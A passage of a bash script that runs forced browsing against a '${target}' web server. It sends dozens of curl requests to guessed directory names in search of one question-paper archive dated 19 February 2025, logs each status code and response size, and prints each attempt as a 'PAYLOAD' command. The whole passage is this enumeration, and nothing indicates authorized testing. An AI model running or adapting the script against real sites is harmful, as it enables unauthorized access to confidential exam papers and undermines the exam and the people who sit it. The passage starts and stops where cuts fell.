${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataBatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataBatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Platform/QP19_02_2025%2001_16_01.zip]:"
